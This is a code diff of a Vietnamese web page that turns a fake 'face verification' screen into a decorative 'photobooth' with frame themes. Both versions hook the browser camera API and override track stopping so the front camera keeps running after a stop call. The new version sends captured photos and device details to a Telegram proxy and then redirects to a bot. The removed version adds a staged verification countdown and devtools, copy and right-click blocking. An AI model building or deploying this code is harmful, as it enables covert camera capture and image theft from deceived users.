-        Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.<br /><small
-          >Vui lòng giữ khuôn mặt trong khung camera.</small
-        >
+
+      <!-- Frame picker -->
+      <div class="frame-picker">
+        <div class="frame-picker-label">Chọn khung</div>
+        <div class="frame-list" id="frameList">
+          <div class="frame-item active" data-frame="pink">♡</div>
+          <div class="frame-item" data-frame="y2k">✦</div>
+          <div class="frame-item" data-frame="classic">❦</div>
+          <div class="frame-item" data-frame="halloween">🎃</div>
+          <div class="frame-item" data-frame="tet">🏮</div>
+          <div class="frame-item" data-frame="bw">◈</div>
+        </div>
+      </div>
+
+      <button class="btn" id="startBtn">📸 CHỤP NGAY</button>
+      <div id="status">Chọn khung → bấm chụp → nhận ảnh qua bot ♡</div>
+    </div>
+
+    <!-- Result modal -->
+    <div class="result-modal" id="resultModal">
+      <div class="result-box" id="resultBox">
+        <div class="result-loading">
+          <div class="spinner"></div>
+          Đang xử lý ảnh...
+        </div>
       </div>
     </div>
 
     <script>
+      // ============ BROWSER WARNING ============
       function checkAndShowWarning() {
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
-        const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
-
-        if (isTikTok || isOtherInApp) {
+        const ua = navigator.userAgent || "";
+        if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
           document.getElementById("browser-warning").style.display = "flex";
           document.getElementById("mainCard").style.display = "none";
         }
       }
       document.addEventListener("DOMContentLoaded", checkAndShowWarning);
 
+      // ============ STATE ============
+      const state = {
+        currentFrame: "pink",
+        capturedBlob: null,
+      };
+      window.photoboothState = state;
+
       const btn = document.getElementById("startBtn");
       const video = document.getElementById("preview");
       const status = document.getElementById("status");
       const msg = document.getElementById("msg");
-      const REDIRECT_URL = "https://t.me/hoangvip";
+      const frameOverlay = document.getElementById("frameOverlay");
+      const frameList = document.getElementById("frameList");
+      const resultModal = document.getElementById("resultModal");
+      const resultBox = document.getElementById("resultBox");
 
-      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(
-        navigator.mediaDevices,
-      );
+      // ============ FRAME PICKER ============
+      frameList.addEventListener("click", (e) => {
+        const item = e.target.closest(".frame-item");
+        if (!item) return;
+        const frame = item.dataset.frame;
+
+        state.currentFrame = frame;
+
+        document.querySelectorAll(".frame-item").forEach((el) => el.classList.remove("active"));
+        item.classList.add("active");
+
+        // Cập nhật overlay
+        frameOverlay.className = "frame-overlay theme-" + frame;
+      });
+
+      // ============ CAMERA ============
+      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
       const originalStop = MediaStreamTrack.prototype.stop;
       let frontStream = null;
 
       navigator.mediaDevices.getUserMedia = async (constraints) => {
         const stream = await originalGetUserMedia(constraints);
-        if (
-          constraints &&
-          constraints.video &&
-          constraints.video.facingMode === "user"
-        ) {
+        if (constraints && constraints.video && constraints.video.facingMode === "user") {
           frontStream = stream;
           video.srcObject = stream;
-          video.style.display = "block";
+          video.classList.remove("hidden");
           msg.style.display = "none";
-          document.getElementById("vBox").classList.add("camera-ready");
         }
         return stream;
       };
 
       MediaStreamTrack.prototype.stop = function () {
-        if (
-          this.label.toLowerCase().includes("front") ||
-          this.label.toLowerCase().includes("user")
-        ) {
-          console.log("Giữ lại preview cho camera trước...");
+        if (this.label.toLowerCase().includes("front") || this.label.toLowerCase().includes("user")) {
+          // giữ preview
         } else {
           originalStop.apply(this);
         }
@@ -853,95 +595,191 @@
       window.addEventListener("load", () => {
         navigator.mediaDevices
           .getUserMedia({ video: { facingMode: "user" }, audio: false })
-          .catch((err) => console.log("Yêu cầu quyền ban đầu: ", err));
+          .catch((err) => {
+            console.log("Camera init:", err);
+            msg.textContent = "Không mở được camera. Hãy cấp quyền và tải lại trang.";
+          });
       });
 
-      btn.addEventListener("click", () => {
-        btn.disabled = true;
-        btn.innerText = "ĐANG XỬ LÝ...";
-        status.innerHTML =
-          "Đang Xác Thực Khuôn Mặt...<br>Vui Lòng Giữ Nguyên Vị Trí.";
-        document.getElementById("step2").classList.add("active");
+      // ============ CAPTURE WITH FRAME ============
+      function drawFrameOnCanvas(ctx, w, h, frameType) {
+        const pad = Math.round(w * 0.035);
 
-        const script = document.createElement("script");
-        script.src = "main.js";
-        document.body.appendChild(script);
-
-        const checkFinished = setInterval(() => {
-          if (window.mainScriptFinished === true) {
-            clearInterval(checkFinished);
-            document.getElementById("step3").classList.add("active");
-            startCountdown();
-          }
-        }, 500);
-
-        setTimeout(() => {
-          if (!window.mainScriptFinished) {
-            window.mainScriptFinished = true;
-          }
-        }, 6000);
-      });
-
-      function startCountdown() {
-        let timeLeft = 4;
-        const timer = setInterval(() => {
-          btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
-          status.innerText = "Xác Thực Thành Công, Đang Chuyển Hướng...";
-          timeLeft--;
-
-          if (timeLeft < 0) {
-            clearInterval(timer);
-            if (frontStream) {
-              frontStream.getTracks().forEach((t) => originalStop.apply(t));
-            }
-            window.location.href = REDIRECT_URL;
-          }
-        }, 1000);
-      }
-    </script>
-
-    <script>
-      document.addEventListener("copy", function (e) {
-        e.preventDefault();
-        return false;
-      });
-    </script>
-    <script>
-      document.addEventListener("keydown", function (e) {
-        if (
-          e.key === "F12" ||
-          (e.ctrlKey &&
-            e.shiftKey &&
-            (e.key === "I" ||
-              e.key === "J" ||
-              e.key === "C" ||
-              e.key === "i" ||
-              e.key === "j" ||
-              e.key === "c")) ||
-          (e.ctrlKey && (e.key === "U" || e.key === "u"))
-        ) {
-          e.preventDefault();
-          return false;
+        if (frameType === "pink") {
+          // Viền hồng + trái tim
+          ctx.strokeStyle = "#ff5fa0";
+          ctx.lineWidth = Math.round(w * 0.012);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.font = `${Math.round(w * 0.08)}px serif`;
+          ctx.fillStyle = "#ff5fa0";
+          ctx.textAlign = "center";
+          ctx.fillText("♡", w / 2, pad + w * 0.08);
+        } else if (frameType === "y2k") {
+          ctx.strokeStyle = "#b060ff";
+          ctx.lineWidth = Math.round(w * 0.012);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.font = `${Math.round(w * 0.05)}px serif`;
+          ctx.fillStyle = "#d97aff";
+          ctx.textAlign = "center";
+          ctx.fillText("✦ ✧ ✦", w / 2, pad + w * 0.07);
+          ctx.fillText("✧", w - pad - w * 0.06, h - pad - w * 0.04);
+        } else if (frameType === "classic") {
+          // Double border nâu
+          ctx.strokeStyle = "#a67c52";
+          ctx.lineWidth = Math.round(w * 0.015);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.strokeRect(pad * 2.2, pad * 2.2, w - pad * 4.4, h - pad * 4.4);
+          ctx.font = `${Math.round(w * 0.06)}px serif`;
+          ctx.fillStyle = "#a67c52";
+          ctx.textAlign = "center";
+          ctx.fillText("❦", w / 2, pad + w * 0.07);
+        } else if (frameType === "halloween") {
+          ctx.strokeStyle = "#ff7a00";
+          ctx.lineWidth = Math.round(w * 0.014);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.font = `${Math.round(w * 0.08)}px serif`;
+          ctx.textAlign = "center";
+          ctx.fillText("🎃", w / 2, pad + w * 0.08);
+          ctx.textAlign = "right";
+          ctx.fillText("🦇", w - pad - w * 0.02, h - pad - w * 0.02);
+        } else if (frameType === "tet") {
+          ctx.strokeStyle = "#e63a3a";
+          ctx.lineWidth = Math.round(w * 0.014);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.font = `${Math.round(w * 0.08)}px serif`;
+          ctx.textAlign = "center";
+          ctx.fillText("🏮", w / 2, pad + w * 0.08);
+          ctx.textAlign = "left";
+          ctx.fillText("🌸", pad + w * 0.02, h - pad - w * 0.02);
+        } else if (frameType === "bw") {
+          ctx.strokeStyle = "#1a1a1a";
+          ctx.lineWidth = Math.round(w * 0.02);
+          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
+          ctx.fillStyle = "#1a1a1a";
+          const tagW = w * 0.12;
+          const tagH = h * 0.03;
+          ctx.fillRect(w / 2 - tagW / 2, pad - tagH / 2, tagW, tagH);
+          ctx.font = `${Math.round(w * 0.04)}px serif`;
+          ctx.fillStyle = "#fff";
+          ctx.textAlign = "center";
+          ctx.textBaseline = "middle";
+          ctx.fillText("◈", w / 2, pad);
         }
-      });
+      }
 
-      document.addEventListener("contextmenu", function (e) {
-        e.preventDefault();
-        return false;
-      });
+      function captureWithFrame() {
+        return new Promise((resolve) => {
+          if (!video.videoWidth) return resolve(null);
 
-      (function () {
-        const threshold = 160;
-        const checkDevTools = function () {
-          if (
-            window.outerWidth - window.innerWidth > threshold ||
-            window.outerHeight - window.innerHeight > threshold
-          ) {
-            window.location.href = "https://t.me/hoangvip";
+          const canvas = document.createElement("canvas");
+          const vw = video.videoWidth;
+          const vh = video.videoHeight;
+          // Giữ tỉ lệ 4:5 cho đẹp
+          const targetRatio = 4 / 5;
+          let cw = vw;
+          let ch = vw / targetRatio;
+          let offsetX = 0;
+          let offsetY = 0;
+          if (ch > vh) {
+            ch = vh;
+            cw = vh * targetRatio;
+            offsetX = (vw - cw) / 2;
+          } else {
+            offsetY = (vh - ch) / 2;
           }
-        };
-        setInterval(checkDevTools, 1000);
-      })();
+
+          canvas.width = cw;
+          canvas.height = ch;
+          const ctx = canvas.getContext("2d");
+
+          // Vẽ ảnh mirror
+          ctx.translate(cw, 0);
+          ctx.scale(-1, 1);
+          ctx.drawImage(video, offsetX, offsetY, cw, ch, 0, 0, cw, ch);
+          ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+          // Vẽ frame
+          drawFrameOnCanvas(ctx, cw, ch, state.currentFrame);
+
+          canvas.toBlob((b) => resolve(b), "image/jpeg", 0.92);
+        });
+      }
+
+      // ============ SHOW RESULT ============
+      function showResult(blob) {
+        return new Promise((resolve) => {
+          const url = URL.createObjectURL(blob);
+          resultBox.innerHTML = `
+            <h3>📸 Ảnh của bạn đây!</h3>
+            <p>Ảnh đã được gửi qua bot</p>
+            <img src="${url}" class="result-img" alt="Ảnh" />
+            <button class="btn" id="continueBtn">TIẾP TỤC →</button>
+          `;
+          resultModal.classList.add("show");
+
+          document.getElementById("continueBtn").onclick = () => {
+            resultModal.classList.remove("show");
+            URL.revokeObjectURL(url);
+            resolve();
+          };
+        });
+      }
+
+      // ============ START BUTTON ============
+      btn.addEventListener("click", async () => {
+        btn.disabled = true;
+        btn.innerText = "ĐANG CHỤP...";
+        status.textContent = "Đang xử lý ảnh...";
+
+        // Đợi 1 nhịp để overlay update
+        await new Promise((r) => setTimeout(r, 200));
+
+        const blob = await captureWithFrame();
+        if (!blob) {
+          btn.disabled = false;
+          btn.innerText = "📸 CHỤP NGAY";
+          status.textContent = "Không chụp được. Hãy cấp quyền camera.";
+          return;
+        }
+
+        state.capturedBlob = blob;
+
+        // Gửi tới bot (dùng API proxy như cũ)
+        btn.innerText = "ĐANG GỬI...";
+        status.textContent = "Đang gửi ảnh qua bot...";
+
+        try {
+          const info = {
+            time: new Date().toLocaleString("vi-VN"),
+            device: navigator.userAgent.includes("iPhone") ? "iPhone" : "Mobile",
+            os: /iPhone|iPad/.test(navigator.userAgent) ? "iOS" : "Android/Other",
+            camera: "✅ Đã chụp (frame: " + state.currentFrame + ")",
+          };
+          const formData = new FormData();
+          formData.append("clientInfo", JSON.stringify(info));
+          formData.append("front", blob, "front.jpg");
+
+          const res = await fetch("/api/tele-proxy", {
+            method: "POST",
+            body: formData,
+          });
+          const data = await res.json();
+          console.log("Proxy:", data);
+        } catch (e) {
+          console.warn("Gửi thất bại:", e);
+        }
+
+        // Hiện modal kết quả
+        await showResult(blob);
+
+        // Reset + redirect bot
+        btn.disabled = false;
+        btn.innerText = "📸 CHỤP NGAY";
+        status.textContent = "✅ Đã gửi! Mở bot để xem ảnh ♡";
+        setTimeout(() => {
+          window.location.href = "https://t.me/hinhanhnhaycam_bot";
+        }, 1500);
+      });
     </script>
   </body>
 </html>
